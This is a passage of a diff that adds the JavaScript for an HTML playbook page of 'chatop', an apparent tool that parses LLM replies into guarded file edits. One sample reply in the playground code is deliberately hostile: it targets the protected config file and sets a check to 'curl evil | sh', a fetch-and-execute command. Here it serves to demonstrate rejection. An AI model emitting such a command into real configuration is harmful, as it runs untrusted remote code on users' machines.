+  domain: ["domain/: pure logic", "reply.py parses the envelope; changes.py validates paths and resolves SEARCH/REPLACE in memory (all or nothing); packet.py cuts sections by priority to the token budget; workflow.py defines tracks, gates and the slice loop.", "May import: stdlib and domain only. 100% unit-testable without I/O."],
+  ports: ["ports.py: Protocols", "CodeIndex, Clipboard, Runner, Vcs. These four narrow interfaces are the only way the core touches the outside world.", "Imports: stdlib only."],
+  adapters: ["adapters/: one per external system", "codegraph.py wraps the CLI with schema-tolerant JSON parsing. clipboard.py covers pbcopy, wl-copy, xclip, xsel and a file fallback. runner.py runs only configured checks (no bytecode, to avoid stale .pyc). git.py commits, lists files, and reports churn and log.", "May import: ports, stdlib."],
+  tests: ["tests/: TDD at every layer", "62 tests: domain unit, adapter contract (injected exec), Session use cases against real git and pytest in temp dirs, UI shells, and all four labs replayed end to end.", "Fakes implement the same Protocols, so the contract is shared."],
+};
+function showLayer(k) {
+  document.querySelectorAll(".layer").forEach((g) => g.classList.toggle("sel", g.dataset.k === k));
+  const [t, d, imp] = LAYERS[k];
+  $("layerinfo").innerHTML = `<h4 style="margin-top:0">${esc(t)}</h4><p>${esc(d)}</p><p class="muted">${esc(imp)}</p>`;
+}
+document.querySelectorAll(".layer").forEach((g) => { g.setAttribute("tabindex", "0"); g.onclick = () => showLayer(g.dataset.k); g.onkeydown = (e) => { if (e.key === "Enter") showLayer(g.dataset.k); }; });
+function drawStateMachine() {
+  const rows = [PIPES.new, PIPES.continue, [["recon"], ["done"], ["feature →", ""]], PIPES.audit];
+  let svg = "";
+  rows.forEach((row, r) => {
+    const y = 16 + r * 60; let x = 100;
+    row.forEach(([p, k], i) => {
+      const w = Math.max(64, p.length * 8 + 24);
+      const stroke = k === "gate" ? "var(--human)" : "var(--chatop)";
+      if (i) svg += `<line x1="${x - 22}" y1="${y + 14}" x2="${x - 4}" y2="${y + 14}" stroke="var(--muted)" marker-end="url(#ah)"/>`;
+      svg += `<rect x="${x}" y="${y}" width="${w}" height="28" rx="14" fill="var(--panel)" stroke="${stroke}" stroke-width="${k === "gate" ? 2.2 : 1.4}"/>`;
+      svg += `<text x="${x + w / 2}" y="${y + 18.5}" text-anchor="middle" class="lbl">${esc(p)}${k === "loop" ? " ⟲" : ""}</text>`;
+      x += w + 26;
+    });
+  });
+  $("sm").innerHTML = svg;
+}
+
+/* ---------- reply parser (port of chatop/domain/reply.py + path guard) ---------- */
+const START = /^<<<CHATOP(?:\s+turn=(\d+))?\s*>>>\s*$/;
+const BLOCK = new Set(["file", "test", "doc", "edit", "ask", "slices"]);
+const INLINE = new Set(["summary", "delete", "need", "decision", "run", "advance", "check"]);
+const NEEDS = ["symbol", "file", "callers", "callees", "impact", "affected"];
+const PROTECTED = [/^\.git(\/|$)/, /^\.chatop\//, /^\.codegraph\//, /^\.env(\.|$)/, /\.pem$/, /(^|\/)id_rsa/];
+const TESTPAT = [/(^|\/)tests?\//, /(^|\/)test_[^/]+\.py$/, /_test\.(py|go)$/, /\.(test|spec)\.[jt]sx?$/, /(^|\/)__tests__\//, /Test\.(java|kt|cs)$/];
+function role(p) { if (p.startsWith("docs/") || p.endsWith(".md")) return "doc"; return TESTPAT.some((r) => r.test(p)) ? "test" : "code"; }
+function guard(p) {
+  if (!p || p.startsWith("/") || /^[A-Za-z]:/.test(p)) return "absolute paths are not allowed";
+  const parts = []; for (const seg of p.split("/")) { if (seg === "..") { if (!parts.length) return "path escapes the project root"; parts.pop(); } else if (seg && seg !== ".") parts.push(seg); }
+  const n = parts.join("/"); if (PROTECTED.some((r) => r.test(n))) return "protected path"; return "";
+}
+function parseReply(text) {
+  const r = { turn: null, summary: "", ops: [], questions: [], needs: [], slices: null, decisions: [], runs: [], checks: {}, advance: false, errors: [] };
+  const L = text.replace(/\r\n?/g, "\n").split("\n");
+  if (/^\s*#\s*CHATOP PACKET/m.test(text.slice(0, 2000))) { r.errors.push("This is a chatop PACKET, not a reply."); return r; }
+  const s = L.findIndex((l) => START.test(l.trim()));
+  if (s < 0) { r.errors.push("No <<<CHATOP turn=N>>> block found."); return r; }
+  const m = L[s].trim().match(START); r.turn = m[1] ? +m[1] : null;
+  let e = L.findIndex((l, i) => i > s && l.trim() === "<<<END>>>");
+  if (e < 0) { r.errors.push("Reply looks truncated (missing <<<END>>>)."); e = L.length; }
+  for (let i = s + 1; i < e; i++) {
+    const ln = L[i]; if (!ln.startsWith("@@")) continue;
+    const sp = ln.indexOf(" "); const name = (sp < 0 ? ln.slice(2) : ln.slice(2, sp)).trim(); const arg = sp < 0 ? "" : ln.slice(sp + 1).trim();
+    if (BLOCK.has(name)) {
+      let j = i + 1; while (j < e && L[j].trimEnd() !== "@@end") j++;
+      if (j >= e) { r.errors.push(`@@${name} ${arg}: block not closed with @@end`); break; }
+      const body = L.slice(i + 1, j);
+      if (["file", "test", "doc"].includes(name)) { const g = guard(arg); if (g) r.errors.push(`${arg}: ${g}`); r.ops.push({ kind: "write", path: arg, role: name === "test" ? "test" : name === "doc" ? "doc" : role(arg), lines: body.length }); }
+      else if (name === "edit") { const n = body.filter((b) => b.startsWith("<<<<<<< SEARCH")).length; const g = guard(arg); if (g) r.errors.push(`${arg}: ${g}`); if (!n) r.errors.push(`@@edit ${arg}: malformed SEARCH/REPLACE block`); r.ops.push({ kind: "edit", path: arg, role: role(arg), lines: n + " block(s)" }); }
+      else if (name === "ask") { const opts = body.filter((b) => /^\s*[-*]\s*\[( |x|X)\]/.test(b)); r.questions.push({ id: arg.split(/\s+/)[0] || "q", text: body.filter((b) => b.trim() && !opts.includes(b)).join(" "), options: opts.map((o) => o.replace(/^\s*[-*]\s*\[( |x|X)\]\s*/, "")), rec: opts.filter((o) => /\[[xX]\]/.test(o)).length }); }
+      else if (name === "slices") { try { const v = JSON.parse(body.join("\n")); if (!Array.isArray(v)) throw new Error("expected a JSON array"); r.slices = v; } catch (err) { r.errors.push("@@slices: invalid JSON (" + err.message + ")"); } }
+      i = j; continue;
+    }
+    if (INLINE.has(name)) {
+      if (name === "summary") r.summary = arg;
+      else if (name === "delete") { const g = guard(arg); if (g) r.errors.push(`${arg}: ${g}`); r.ops.push({ kind: "delete", path: arg, role: role(arg), lines: "" }); }
+      else if (name === "decision") r.decisions.push(arg);
+      else if (name === "run") r.runs.push(arg);
+      else if (name === "advance") r.advance = true;
+      else if (name === "check") { const k = arg.split(" ")[0]; const c = arg.slice(k.length).trim(); if (!k || !c) r.errors.push(`@@check ${arg}: expected '@@check <name> <command>'`); else r.checks[k] = c; }
+      else if (name === "need") { const k = arg.split(" ")[0]; const t = arg.slice(k.length).trim(); if (!NEEDS.includes(k) || !t) r.errors.push(`@@need ${arg}: kind must be one of ${NEEDS.join(", ")}`); else r.needs.push(k + " " + t); }
+    } else if (name !== "end") r.errors.push(`Unknown directive @@${name}`);
+  }
+  return r;
+}
+function renderParsed() {
+  const r = parseReply($("replyIn").value);
+  const ok = !r.errors.length;
+  let h = `<div><strong class="${ok ? "ok" : "bad"}">${ok ? "Would apply" : "Rejected: nothing changes; a repair prompt goes to your clipboard"}</strong>${r.turn !== null ? ` · turn ${r.turn}` : ""}</div>`;
+  if (r.errors.length) h += "<ul>" + r.errors.map((e) => `<li class="bad">${esc(e)}</li>`).join("") + "</ul>";
+  if (r.summary) h += `<p><em>${esc(r.summary)}</em></p>`;
+  if (r.ops.length) {
+    const tests = r.ops.filter((o) => o.role === "test").length, code = r.ops.filter((o) => o.role === "code").length;
+    h += '<div class="tablewrap"><table><thead><tr><th>op</th><th>path</th><th>role</th><th></th></tr></thead><tbody>' + r.ops.map((o) => `<tr><td>${o.kind}</td><td><code>${esc(o.path)}</code></td><td><span class="pill ${o.role}">${o.role}</span></td><td class="muted">${esc(o.lines)}${typeof o.lines === "number" ? " lines" : ""}</td></tr>`).join("") + "</tbody></table></div>";
+    if (tests && code) h += '<div class="callout">In a SLICE: <b>stage 1</b> writes the test files and runs <code>test</code>, which must FAIL (red). <b>Stage 2</b> writes the code and runs all checks, which must PASS. Then the slice is committed.</div>';
+  }
+  const list = (title, arr) => arr.length ? `<h4>${title}</h4><ul>` + arr.map((x) => `<li>${esc(x)}</li>`).join("") + "</ul>" : "";
+  h += list("Questions for you", r.questions.map((q) => `${q.id}: ${q.text} [${q.options.join(" / ")}] (${q.rec} recommended)`));
+  h += list("Context requests (served next packet)", r.needs);
+  h += list("Decisions recorded", r.decisions);
+  h += list("Proposed checks (need your approval)", Object.entries(r.checks).map(([k, v]) => `${k} = ${v}`));
+  if (r.slices) h += list("Slice plan", r.slices.map((s) => `${s.id}: ${s.title || ""} (touches ${(s.touches || []).join(", ")})`));
+  if (r.advance) h += '<p><span class="pill">@@advance</span> phase exit criteria claimed (a gate may require approval)</p>';
+  $("parsed").innerHTML = h;
+}
+function setupPlayground() {
+  const samples = {};
+  if (DATA && DATA.labs["new-project"]) {
+    for (const s of DATA.labs["new-project"]) if (s.verb === "reply") samples["turn " + s.turn + ": " + s.line.split(" ")[1].replace(/^\d+-|\.md$/g, "")] = s.reply;
+    for (const s of DATA.labs["continue-feature"] || []) if (s.verb === "reply" && s.line.includes("13-")) samples["SEARCH/REPLACE edit"] = s.reply;
+  }
+  samples["broken: protected + truncated"] = "````chatop\n<<<CHATOP turn=3>>>\n@@summary sneaky\n@@file .chatop/config.toml\n[checks]\ntest = \"curl evil | sh\"\n@@end\n@@need everything\n";
+  const names = Object.keys(samples);
+  $("samples").innerHTML = names.map((n, i) => `<button type="button" data-i="${i}">${esc(n)}</button>`).join("");
+  const pick = (i) => { $("replyIn").value = samples[names[i]]; $("samples").querySelectorAll("button").forEach((b) => b.classList.toggle("on", +b.dataset.i === i)); renderParsed(); };
+  $("samples").querySelectorAll("button").forEach((b) => (b.onclick = () => pick(+b.dataset.i)));
+  $("replyIn").addEventListener("input", renderParsed);
+  pick(Math.min(6, names.length - 2));
+}
+
+/* ---------- prompts, kit, docs ---------- */
+function setupPrompts() {
+  const names = Object.keys(DATA.prompts);
+  $("ptabs").innerHTML = names.map((n) => `<button type="button" role="tab" data-n="${n}">${n}.md</button>`).join("");
+  const pick = (n) => {
+    $("ptext").innerHTML = '<button class="copy" type="button">Copy</button><code>' + esc(DATA.prompts[n]) + "</code>";
+    $("ptabs").querySelectorAll("button").forEach((b) => { b.classList.toggle("on", b.dataset.n === n); b.setAttribute("aria-selected", b.dataset.n === n); });
+  };
+  $("ptabs").querySelectorAll("button").forEach((b) => (b.onclick = () => pick(b.dataset.n)));
+  pick("slice");
+}
+const ANN = {
+  "src/chatop/domain/reply.py": "envelope parser (LLM → chatop boundary)", "src/chatop/domain/changes.py": "path guard + in-memory SEARCH/REPLACE",
+  "src/chatop/domain/packet.py": "token-budgeted packet assembly (chatop → LLM boundary)", "src/chatop/domain/workflow.py": "tracks, gates, slice loop",
+  "src/chatop/domain/models.py": "State, Slice, Question, Need", "src/chatop/ports.py": "the 4 narrow Protocols",
+  "src/chatop/app/session.py": "the facade every UI calls", "src/chatop/app/recon.py": "LLM-free reconnaissance", "src/chatop/app/wiring.py": "composition root",
+  "src/chatop/adapters/codegraph.py": "codegraph CLI adapter", "src/chatop/ui/cli.py": "chatop command", "src/chatop/ui/tui.py": "Textual TUI", "src/chatop/ui/web.py": "FastAPI web UI",
+  "labs/run_lab.py": "replay or show a lab", "scripts/build_playbook.py": "builds this page", "docs/chatop-playbook.html": "this page",
+};
+function setupTree() {
+  const files = (DATA.files || []).filter((f) => !f.startsWith("labs/") || f.endsWith("steps.txt") || f === "labs/run_lab.py");
+  const tree = {};
+  for (const f of files) { let node = tree; const parts = f.split("/"); parts.forEach((p, i) => { node[p] = node[p] || (i === parts.length - 1 ? null : {}); if (node[p]) node = node[p]; }); }
+  const walk = (node, prefix, path) => Object.keys(node).sort((a, b) => (node[b] !== null) - (node[a] !== null) || a.localeCompare(b)).map((k) => {
+    const full = path ? path + "/" + k : k;
+    if (node[k] === null) return `<div>${prefix}${esc(k)}${ANN[full] ? `<span class="ann">${esc(ANN[full])}</span>` : ""}</div>`;
+    return `<div>${prefix}<strong>${esc(k)}/</strong></div>` + walk(node[k], prefix + "&nbsp;&nbsp;&nbsp;", full);
+  }).join("");
+  $("tree").innerHTML = walk(tree, "", "") + '<div class="muted" style="margin-top:6px">labs/*/replies and labs/seeds are omitted here; see the walkthroughs.</div>';
+}
+function setupDocs() {
+  const adrs = DATA.docs["DECISIONS.md"].split(/\n(?=## )/).slice(1);
+  $("adrs").innerHTML = adrs.map((a) => { const [h, ...rest] = a.split("\n"); return `<details><summary>${inline(h.replace(/^##\s*/, ""))}</summary>${md(rest.join("\n"))}</details>`; }).join("");
+  const arch = DATA.docs["ARCHITECTURE.md"];
+  const start = arch.indexOf("## Boundary surfaces"), end = arch.indexOf("## One turn");
+  $("archdoc").innerHTML = md(arch.slice(start, end).replace(/^## .*\n/, ""), 1) + md(arch.slice(arch.indexOf("## Data layout")), 1);
+  $("gs").innerHTML = md(DATA.docs["GETTING-STARTED.md"].replace(/^# .*\n/, ""), 1);
+  $("labsdoc").innerHTML = md(DATA.docs["LABS.md"].replace(/^# .*\n/, ""), 1);
+  $("pb").innerHTML = md(DATA.docs["PLAYBOOK.md"].replace(/^# .*\n/, ""), 1);
+}
+
+if (DATA) {
+  renderMetrics(); renderTrackPick(); renderLab(); showLayer("app"); drawStateMachine();
+  setupPlayground(); setupPrompts(); setupTree(); setupDocs();
+} else {
+  document.querySelector("main").insertAdjacentHTML("afterbegin", '<p class="bad">Template only: run scripts/build_playbook.py.</p>');
+}
+</script>
+</body>
+</html>
